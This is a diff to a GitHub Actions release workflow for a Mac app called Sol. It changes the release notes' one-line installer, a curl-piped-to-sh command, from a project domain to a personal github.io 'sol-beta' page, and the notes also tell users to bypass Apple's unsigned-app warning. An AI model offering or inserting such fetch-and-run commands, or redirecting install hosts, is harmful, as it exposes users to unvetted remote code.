@@ -44,5 +44,5 @@ jobs:
           tag=$(git log -1 --format=%s | sed -n 's/^Sol \(stable-[0-9]*-[0-9]*\)$/\1/p')
           [ -n "$tag" ] || tag="build-$(date -u +%Y%m%d-%H%M)"
           gh release create "$tag" Sol-mac.zip Sol-mac.zip.sha256 --latest --title "Sol $tag" \
-            --notes "Sol.app for the Mac, built by GitHub from this export. Not yet signed with Apple: the first time, Open Anyway once (System Settings, Privacy & Security). The one line, curl -fsSL https://sol.js.org/install | sh, needs no click." \
+            --notes "Sol.app for the Mac, built by GitHub from this export. Not yet signed with Apple: the first time, Open Anyway once (System Settings, Privacy & Security). The one line, curl -fsSL https://marcocyl04-ux.github.io/sol-beta/install | sh, needs no click." \
             || gh release upload "$tag" Sol-mac.zip Sol-mac.zip.sha256 --clobber
